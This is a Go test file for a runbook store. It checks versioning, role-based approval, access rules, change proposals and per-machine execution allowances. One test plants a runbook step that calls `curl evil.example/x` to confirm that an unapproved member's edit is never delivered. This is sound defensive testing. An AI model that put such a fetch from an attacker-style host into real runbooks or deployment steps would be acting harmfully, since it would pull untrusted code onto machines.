package store

import (
	"errors"
	"testing"

	"github.com/Deadweight-Labs/ghosttree/internal/runbook"
	"github.com/Deadweight-Labs/ghosttree/internal/scope"
)

func rbSpec(purpose string) runbook.Spec {
	return runbook.Spec{
		Purpose:  purpose,
		Params:   []runbook.Param{{Name: "sha", Type: runbook.TypeSHA}},
		Steps:    []runbook.Step{{Title: "build", Command: "scripts/build-dist.sh {{sha}}"}, {Title: "start", Command: "systemctl start x"}},
		Triggers: runbook.Triggers{Keywords: []string{"ausrollen"}},
		Targets:  []runbook.Target{{Name: "build", Comment: "build the binary", Steps: []runbook.ExecStep{{Argv: []string{"make", "dist", "SHA={{sha}}"}}}}},
	}
}

// runbookEnv: robin (1) Owner, anna (2) Lead, ben (3) Member, cleo (4) ohne
// Projektrolle, dev (5) ohne Organisation.
func runbookEnv(t *testing.T) *Store {
	t.Helper()
	st := roleFixture(t)
	st.SetAccessMode(AccessMode{Enforce: true})
	if err := setRole(st, "person:1", "person:2", RoleLead, false); err != nil {
		t.Fatal(err)
	}
	if err := setRole(st, "person:1", "person:3", RoleMember, false); err != nil {
		t.Fatal(err)
	}
	return st
}

func writeRB(t *testing.T, st *Store, author int64, person string, approve bool, spec runbook.Spec) RunbookWriteResult {
	t.Helper()
	res, err := st.WriteRunbook(RunbookWrite{Project: roleProject, Name: "rollout", Spec: spec, Person: person, AuthorID: author, Approve: approve, Anchor: anchorAt(commitA, "main")})
	if err != nil {
		t.Fatal(err)
	}
	return res
}

func TestRunbookSchemaIsIdempotentAndVersionsAreImmutable(t *testing.T) {
	st := runbookEnv(t)
	for i := 0; i < 3; i++ {
		if err := ensureRunbooks(st.db); err != nil {
			t.Fatal(err)
		}
	}
	writeRB(t, st, 1, "robin", true, rbSpec("v1"))
	for _, q := range []string{
		`UPDATE runbook_versions SET spec='{}'`,
		`DELETE FROM runbook_versions`,
		`DELETE FROM runbooks`,
		`UPDATE runbook_approvals SET person='x'`,
		`DELETE FROM runbook_approvals`,
	} {
		if _, err := st.db.Exec(q); err == nil {
			t.Errorf("%s was allowed", q)
		}
	}
}

// Jede Fassung bleibt (#1444), gleicher Inhalt legt keine neue an, Anker und
// Hash stehen an der Fassung.
func TestRunbookVersionsKeepEveryVersionAndDedupe(t *testing.T) {
	st := runbookEnv(t)
	a := writeRB(t, st, 1, "robin", true, rbSpec("v1"))
	if !a.NewRunbook || !a.NewVersion || a.Version != 1 {
		t.Fatalf("first write: %+v", a)
	}
	same := writeRB(t, st, 1, "robin", true, rbSpec("v1"))
	if same.NewVersion || same.Version != 1 {
		t.Fatalf("identical content created a version: %+v", same)
	}
	b := writeRB(t, st, 2, "anna", false, rbSpec("v2"))
	if !b.NewVersion || b.Version != 2 || b.ID != a.ID {
		t.Fatalf("second write: %+v", b)
	}
	hist, err := st.RunbookHistory(a.ID)
	if err != nil || len(hist) != 2 {
		t.Fatalf("history = %d %v", len(hist), err)
	}
	if hist[0].Spec.Purpose != "v1" || hist[1].Spec.Purpose != "v2" || hist[0].Hash == hist[1].Hash {
		t.Fatalf("history lost a version: %+v", hist)
	}
	if hist[0].GitAnchor == nil || hist[0].GitAnchor.Commit != commitA {
		t.Fatalf("anchor missing on the version: %+v", hist[0].GitAnchor)
	}
	if hist[0].Hash != runbook.Hash(roleProject, "", "rollout", hist[0].Spec) {
		t.Fatal("stored hash is not the content hash")
	}
}

// Fremder ändert Ablauf: die Spitze eines Mitglieds ist nicht freigegeben, die
// Auslieferung nimmt die freigegebene Fassung, der Hash der Spitze ist ein
// anderer.
func TestRunbookMemberVersionIsNotApprovedAndDeliveryKeepsTheApprovedOne(t *testing.T) {
	st := runbookEnv(t)
	a := writeRB(t, st, 1, "robin", true, rbSpec("sicher"))
	evil := rbSpec("boese")
	evil.Targets[0].Steps[0].Argv = []string{"curl", "evil.example/x"}
	writeRB(t, st, 3, "ben", true /* ein Mitglied verlangt Freigabe: der Server verweigert sie, der Store trägt sie ein */, evil)

	head, err := st.RunbookView(a.ID, 0)
	if err != nil {
		t.Fatal(err)
	}
	// Der Store trägt ein, was der Server erlaubt hat. Zählen darf die Freigabe
	// eines Mitglieds trotzdem nicht: approverOf prüft die Rolle jetzt.
	if head.Version != 2 || head.Approved {
		t.Fatalf("a member's own approval counted: %+v", head)
	}
	if head.ApprovedVersion != 1 {
		t.Fatalf("approved version = %d, want 1", head.ApprovedVersion)
	}
	del, err := st.RunbookTriggerable(scope.Axes{Project: roleProject}, 1)
	if err != nil || len(del) != 1 {
		t.Fatalf("triggerable = %d %v", len(del), err)
	}
	if del[0].View.Version != 1 || del[0].View.Spec.Purpose != "sicher" {
		t.Fatalf("delivery took the member's version: %+v", del[0].View)
	}
	// Ein Lead gibt die neue Fassung frei: jetzt gilt sie.
	if err := st.ApproveRunbookVersion(a.ID, 2, 2, "anna"); err != nil {
		t.Fatal(err)
	}
	head, _ = st.RunbookView(a.ID, 0)
	if !head.Approved || head.ApprovedBy != "anna" {
		t.Fatalf("lead approval did not count: %+v", head)
	}
	// Wird der Lead herabgestuft, zählt seine Freigabe nicht mehr.
	if err := setRole(st, "person:1", "person:2", RoleMember, false); err != nil {
		t.Fatal(err)
	}
	head, _ = st.RunbookView(a.ID, 0)
	if head.Approved {
		t.Fatalf("approval of a demoted lead still counts: %+v", head)
	}
}

func TestRunbookAccessRules(t *testing.T) {
	st := runbookEnv(t)
	a := writeRB(t, st, 1, "robin", true, rbSpec("x"))
	ref, err := st.RunbookRefByID(a.ID)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct {
		who         string
		read, write bool
		approve     bool
	}{
		{"person:1", true, true, true},
		{"person:2", true, true, true},
		{"person:3", true, true, false}, // Mitglied: lesen, neue Fassung schreiben, nicht freigeben
		{"person:4", false, false, false},
		{"person:5", false, false, false},
	} {
		pa := st.Access(Principal{ID: c.who})
		if got := pa.CanSeeRunbook(ref); got != c.read {
			t.Errorf("%s read = %v", c.who, got)
		}
		if got := pa.CheckRunbook(ref, ActEdit) == nil; got != c.write {
			t.Errorf("%s write = %v", c.who, got)
		}
		if got := pa.MayApproveRunbook(ref.Project, ref.Machine, pa.runbookObject(ref).Own); got != c.approve {
			t.Errorf("%s approve = %v", c.who, got)
		}
		if !c.read {
			// Unbekannt = Fremd: dieselbe Antwort.
			if err := pa.CheckRunbook(ref, ActRead); !errors.Is(err, ErrAccessNotFound) {
				t.Errorf("%s: hidden runbook answered %v", c.who, err)
			}
		}
	}
}

func TestRunbookGlobalAndMachineScopeBelongToTheAuthor(t *testing.T) {
	st := runbookEnv(t)
	res, err := st.WriteRunbook(RunbookWrite{Name: "privat", Spec: rbSpec("mein"), Person: "ben", AuthorID: 3, Approve: true})
	if err != nil {
		t.Fatal(err)
	}
	ref, _ := st.RunbookRefByID(res.ID)
	if !st.Access(Principal{ID: "person:3"}).CanSeeRunbook(ref) {
		t.Fatal("the author does not see their own global runbook")
	}
	for _, who := range []string{"person:1", "person:2", "person:4"} {
		if st.Access(Principal{ID: who}).CanSeeRunbook(ref) {
			t.Errorf("%s sees a global runbook of another author", who)
		}
	}
	// Freigabe ohne Projekt: nur die des Autors zählt.
	v, _ := st.RunbookView(res.ID, 0)
	if !v.Approved {
		t.Fatalf("author approval of a global runbook: %+v", v)
	}
	if err := st.ApproveRunbookVersion(res.ID, 1, 1, "robin"); err != nil {
		t.Fatal(err)
	}
	// Derselbe Name bei einem anderen Autor ist ein anderer Ablauf.
	other, err := st.WriteRunbook(RunbookWrite{Name: "privat", Spec: rbSpec("deins"), Person: "robin", AuthorID: 1})
	if err != nil || other.ID == res.ID || !other.NewRunbook {
		t.Fatalf("second author: %+v %v", other, err)
	}
	if ref, err := st.RunbookRefByScope("", "", "privat", 3); err != nil || ref.ID != res.ID {
		t.Fatalf("lookup for the first author: %+v %v", ref, err)
	}
	if refs, _ := st.RunbookRefsIn(scope.Axes{}, 3); len(refs) != 1 || refs[0].ID != res.ID {
		t.Fatalf("a list shows another author's global runbook: %+v", refs)
	}
}

func TestRunbookRunsDeviationsAndProposals(t *testing.T) {
	st := runbookEnv(t)
	a := writeRB(t, st, 1, "robin", true, rbSpec("x"))
	// Ein erfolgreicher Lauf auf einem Commit.
	run, err := st.RecordRunbookRun(RunbookRunInput{RunbookID: a.ID, Version: 1, Mode: runbook.ModeChecklist, Result: runbook.ResultOK,
		Params: map[string]string{"sha": "abc1234"}, Machine: "Mainex", Person: "robin", AuthorID: 1, Anchor: anchorAt(commitB, "feat/x")})
	if err != nil || run.ProposalID != 0 {
		t.Fatalf("run: %+v %v", run, err)
	}
	v, _ := st.RunbookView(a.ID, 0)
	if v.LastSuccess == nil || v.LastSuccess.GitAnchor == nil || v.LastSuccess.GitAnchor.Commit != commitB || v.LastSuccess.Machine != "mainex" {
		t.Fatalf("last success = %+v", v.LastSuccess)
	}
	if got := v.LastSuccess.LastSuccessLine(); got == "" || got == "last success: none reported yet" {
		t.Fatalf("line = %q", got)
	}
	// Ein fehlgeschlagener Lauf ersetzt den letzten Erfolg nicht.
	if _, err := st.RecordRunbookRun(RunbookRunInput{RunbookID: a.ID, Version: 1, Mode: runbook.ModeExec, Result: runbook.ResultFailed, Person: "ben", AuthorID: 3}); err != nil {
		t.Fatal(err)
	}
	v, _ = st.RunbookView(a.ID, 0)
	if v.LastSuccess == nil || v.LastSuccess.Person != "robin" {
		t.Fatalf("a failed run replaced the last success: %+v", v.LastSuccess)
	}
	// Abweichung: zusätzlicher Schritt → Vorschlag, noch keine Änderung.
	devs := []runbook.Deviation{{Kind: runbook.DevAdd, Step: 2, Title: "Cache leeren", Command: "make clean"}}
	run, err = st.RecordRunbookRun(RunbookRunInput{RunbookID: a.ID, Version: 1, Mode: runbook.ModeChecklist, Result: runbook.ResultOK, Person: "ben", AuthorID: 3, Deviations: devs})
	if err != nil || run.ProposalID == 0 {
		t.Fatalf("deviation made no proposal: %+v %v", run, err)
	}
	if v, _ = st.RunbookView(a.ID, 0); v.Head != 1 || v.PendingProposals != 1 {
		t.Fatalf("the proposal changed the runbook: %+v", v)
	}
	// Annehmen: neue, freigegebene Fassung; die Ziele sind unverändert.
	p, err := st.DecideRunbookProposal(run.ProposalID, true, 1, "robin", anchorAt(commitB, "main"), nil)
	if err != nil || p.State != "accepted" || p.ResultVer != 2 {
		t.Fatalf("decide: %+v %v", p, err)
	}
	v, _ = st.RunbookView(a.ID, 0)
	if v.Version != 2 || !v.Approved || len(v.Spec.Steps) != 3 || v.Spec.Steps[1].Title != "Cache leeren" {
		t.Fatalf("accepted proposal: %+v", v)
	}
	if v.Person != "ben" {
		t.Fatalf("the version should name the proposer, got %q", v.Person)
	}
	old, _ := st.RunbookView(a.ID, 1)
	if len(v.Spec.Targets) != 1 || v.Spec.Targets[0].Steps[0].Argv[2] != old.Spec.Targets[0].Steps[0].Argv[2] {
		t.Fatal("a proposal changed an executable target")
	}
	// Zweimal entscheiden geht nicht.
	var conflict *ErrRunbookConflict
	if _, err := st.DecideRunbookProposal(run.ProposalID, true, 1, "robin", nil, nil); !errors.As(err, &conflict) {
		t.Fatalf("second decision: %v", err)
	}
}

func TestRunbookStaleProposalIsRefusedAndRejectionChangesNothing(t *testing.T) {
	st := runbookEnv(t)
	a := writeRB(t, st, 1, "robin", true, rbSpec("x"))
	devs := []runbook.Deviation{{Kind: runbook.DevRemove, Step: 1}}
	run, _ := st.RecordRunbookRun(RunbookRunInput{RunbookID: a.ID, Version: 1, Mode: runbook.ModeChecklist, Result: runbook.ResultOK, Person: "ben", AuthorID: 3, Deviations: devs})
	run2, _ := st.RecordRunbookRun(RunbookRunInput{RunbookID: a.ID, Version: 1, Mode: runbook.ModeChecklist, Result: runbook.ResultOK, Person: "ben", AuthorID: 3, Deviations: devs})
	writeRB(t, st, 1, "robin", true, rbSpec("neu")) // die Spitze wandert
	var conflict *ErrRunbookConflict
	if _, err := st.DecideRunbookProposal(run.ProposalID, true, 1, "robin", nil, nil); !errors.As(err, &conflict) {
		t.Fatalf("stale proposal accepted: %v", err)
	}
	p, err := st.DecideRunbookProposal(run2.ProposalID, false, 1, "robin", nil, nil)
	if err != nil || p.State != "rejected" {
		t.Fatalf("reject: %+v %v", p, err)
	}
	if v, _ := st.RunbookView(a.ID, 0); v.Head != 2 {
		t.Fatalf("rejecting created a version: head %d", v.Head)
	}
}

func TestRunbookCandidatesPreferTheMostSpecificScope(t *testing.T) {
	st := runbookEnv(t)
	for _, in := range []RunbookWrite{
		{Name: "x", Spec: rbSpec("global"), Person: "robin", AuthorID: 1},
		{Machine: "mainex", Name: "x", Spec: rbSpec("maschine"), Person: "robin", AuthorID: 1},
		{Project: roleProject, Name: "x", Spec: rbSpec("projekt"), Person: "robin", AuthorID: 1},
		{Project: roleProject, Machine: "mainex", Name: "x", Spec: rbSpec("beides"), Person: "robin", AuthorID: 1},
		{Project: "github.com/dw/other", Name: "x", Spec: rbSpec("fremdes projekt"), Person: "robin", AuthorID: 1},
	} {
		if _, err := st.WriteRunbook(in); err != nil {
			t.Fatal(err)
		}
	}
	refs, err := st.RunbookCandidates("x", scope.Axes{Project: roleProject, Machine: "mainex"}, 1)
	if err != nil || len(refs) != 4 {
		t.Fatalf("candidates = %d %v", len(refs), err)
	}
	if refs[0].Project == "" || refs[0].Machine == "" || refs[3].Project != "" || refs[3].Machine != "" {
		t.Fatalf("order: %+v", refs)
	}
}

func TestRunbookInputIsValidatedInTheStore(t *testing.T) {
	st := runbookEnv(t)
	for _, name := range []string{"", "Rollout", "a b", "x\ny", "../x"} {
		if _, err := st.WriteRunbook(RunbookWrite{Project: roleProject, Name: name, Spec: rbSpec("x"), Person: "robin", AuthorID: 1}); err == nil {
			t.Errorf("name %q accepted", name)
		}
	}
	bad := rbSpec("x\nbreak")
	if _, err := st.WriteRunbook(RunbookWrite{Project: roleProject, Name: "ok", Spec: bad, Person: "robin", AuthorID: 1}); err == nil {
		t.Error("multi-line purpose accepted")
	}
	if _, err := st.RecordRunbookRun(RunbookRunInput{RunbookID: 99, Version: 1, Mode: "exec", Result: "ok"}); !errors.Is(err, ErrRunbookNotFound) {
		t.Errorf("unknown runbook: %v", err)
	}
}

// Im Log-Modus gibt Check() alles frei; die Freigabe darf davon nicht abhängen.
func TestRunbookApprovalIgnoresTheEnforcementMode(t *testing.T) {
	for _, enforce := range []bool{true, false} {
		st := runbookEnv(t)
		st.SetAccessMode(AccessMode{Enforce: enforce})
		a := writeRB(t, st, 1, "robin", true, rbSpec("x"))
		ref, _ := st.RunbookRefByID(a.ID)
		for who, want := range map[string]error{"person:1": nil, "person:2": nil, "person:3": ErrAccessForbidden, "person:4": ErrAccessNotFound, "person:5": ErrAccessNotFound} {
			if got := st.Access(Principal{ID: who}).CheckRunbook(ref, ActApprove); !errors.Is(got, want) && got != want {
				t.Errorf("enforce=%v %s: CheckRunbook(approve) = %v, want %v", enforce, who, got, want)
			}
		}
	}
}

func withExecution(t *testing.T, on bool) {
	t.Helper()
	old := RunbookExecutionEnabled()
	SetRunbookExecution(on)
	t.Cleanup(func() { SetRunbookExecution(old) })
}

// Die Freigabe je Maschine liegt auf dem Server, je Fassung und Hash, und der
// Schalter steht standardmäßig aus.
func TestRunbookAllowanceIsPerVersionHashAndMachineAndNeedsTheSwitch(t *testing.T) {
	st := runbookEnv(t)
	if RunbookExecutionEnabled() {
		t.Fatal("running runbooks must be off by default")
	}
	a := writeRB(t, st, 1, "robin", true, rbSpec("v1"))
	hash := a.Hash
	req := RunbookAllowRequest{RunbookID: a.ID, Version: 1, Hash: hash, Machine: "Mainex", Person: "operator", Via: "cli-db"}
	// Ausgeschaltet: keine Freigabe möglich, und nichts gilt als freigegeben.
	if err := st.AllowRunbook(req); !errors.Is(err, ErrRunbookExecutionOff) {
		t.Fatalf("allow with the switch off: %v", err)
	}
	if s, err := st.RunbookAllowed(a.ID, 1, "mainex"); err != nil || s.Allowed || s.Reason == "" {
		t.Fatalf("allowed with the switch off: %+v %v", s, err)
	}
	withExecution(t, true)
	if s, _ := st.RunbookAllowed(a.ID, 1, "mainex"); s.Allowed {
		t.Fatalf("allowed without an allowance: %+v", s)
	}
	// Weder ein Token noch ein anderer Weg: nur web und cli-db.
	for _, via := range []string{"", "api", "token", "device"} {
		bad := req
		bad.Via = via
		if err := st.AllowRunbook(bad); err == nil {
			t.Errorf("via %q accepted", via)
		}
	}
	bad := req
	bad.Hash = "deadbeef"
	var conflict *ErrRunbookConflict
	if err := st.AllowRunbook(bad); !errors.As(err, &conflict) {
		t.Fatalf("wrong hash: %v", err)
	}
	if err := st.AllowRunbook(req); err != nil {
		t.Fatal(err)
	}
	if s, _ := st.RunbookAllowed(a.ID, 1, "mainex"); !s.Allowed || s.AllowedBy != "operator" {
		t.Fatalf("after the allowance: %+v", s)
	}
	// Eine andere Maschine ist nicht freigegeben.
	if s, _ := st.RunbookAllowed(a.ID, 1, "other-box"); s.Allowed {
		t.Fatalf("another machine: %+v", s)
	}
	// Eine neue Fassung (anderer Hash) braucht eine neue Freigabe, auch wenn ein Lead sie freigibt.
	b := writeRB(t, st, 2, "anna", true, rbSpec("v2"))
	if s, _ := st.RunbookAllowed(a.ID, b.Version, "mainex"); s.Allowed {
		t.Fatalf("a new version inherited the allowance: %+v", s)
	}
	// Eine nicht freigegebene Fassung eines Mitglieds lässt sich nicht erlauben.
	c := writeRB(t, st, 3, "ben", false, rbSpec("v3 von ben"))
	if err := st.AllowRunbook(RunbookAllowRequest{RunbookID: a.ID, Version: c.Version, Hash: c.Hash, Machine: "mainex", Via: "cli-db"}); !errors.As(err, &conflict) {
		t.Fatalf("allowing an unapproved version: %v", err)
	}
	// Verliert die Freigabe der Fassung ihren Wert (Lead herabgestuft), gilt auch die Erlaubnis nicht mehr.
	if err := st.AllowRunbook(RunbookAllowRequest{RunbookID: a.ID, Version: b.Version, Hash: b.Hash, Machine: "mainex", Via: "cli-db"}); err != nil {
		t.Fatal(err)
	}
	if s, _ := st.RunbookAllowed(a.ID, 2, "mainex"); !s.Allowed {
		t.Fatalf("v2 allowance: %+v", s)
	}
	if err := setRole(st, "person:1", "person:2", RoleMember, false); err != nil {
		t.Fatal(err)
	}
	if s, _ := st.RunbookAllowed(a.ID, 2, "mainex"); s.Allowed {
		t.Fatalf("an allowance outlived the approval it rested on: %+v", s)
	}
	// Zurücknehmen; die Zeile bleibt, und die Zeilen sind sonst unveränderlich.
	if err := st.RevokeRunbookAllowance(a.ID, 1, "mainex"); err != nil {
		t.Fatal(err)
	}
	if s, _ := st.RunbookAllowed(a.ID, 1, "mainex"); s.Allowed {
		t.Fatalf("after revoking: %+v", s)
	}
	for _, q := range []string{`UPDATE runbook_allowances SET machine='x'`, `UPDATE runbook_allowances SET revoked_at=NULL`, `DELETE FROM runbook_allowances`} {
		if _, err := st.db.Exec(q); err == nil {
			t.Errorf("%s was allowed", q)
		}
	}
	// Danach lässt sie sich neu erteilen.
	if err := st.AllowRunbook(req); err != nil {
		t.Fatal(err)
	}
	if s, _ := st.RunbookAllowed(a.ID, 1, "mainex"); !s.Allowed {
		t.Fatalf("re-allow: %+v", s)
	}
}
